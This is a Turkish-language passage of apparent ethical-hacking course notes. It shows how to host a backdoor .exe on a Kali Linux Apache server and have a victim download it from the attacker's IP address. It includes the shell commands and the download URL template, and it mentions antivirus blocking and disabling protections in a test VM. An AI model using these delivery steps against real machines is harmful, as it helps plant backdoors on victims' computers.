- ⚠️ `.exe` dosyası antivirüs tarafından engellenebilir ❌  
- 🚪 Windows’a aktarmak için birkaç yöntem vardır → en basitlerinden biri **web sunucusu açmak** 🌐  

### 📂 Dosyayı Web Sunucusuna Taşımak
- Kali Linux’ta **web sunucu klasörü**: `/var/www/html`  
- 🎯 Backdoorları koymak için bir klasör oluştur ve exe dosyasını buraya taşı:  
```bash
mv <dosya_adi>.exe /var/www/html/<klasor_adi>
```

### 🚀 Apache Web Sunucusunu Başlatmak
```bash
service apache2 start
```
- 🔥 Bu komut ile yerel ağda web yayını başlar  

### 🌐 Dosyaya Erişmek
- Tarayıcıya saldırganın IP adresini yaz:  
```
http://<ip_adresi>/<klasor_adi>/<dosya_adi>.exe
```
- 💾 Böylece `.exe` dosyasının indirme bağlantısına ulaşılır  

### ⚠️ Dikkat!
- Kurbanın tarayıcı ve işletim sistemi güvenlik ayarları açıkken dosya inmeyebilir 🛡️  
- 🧪 Test için **sanal makinede güvenlik ayarları kapatılmalıdır**  
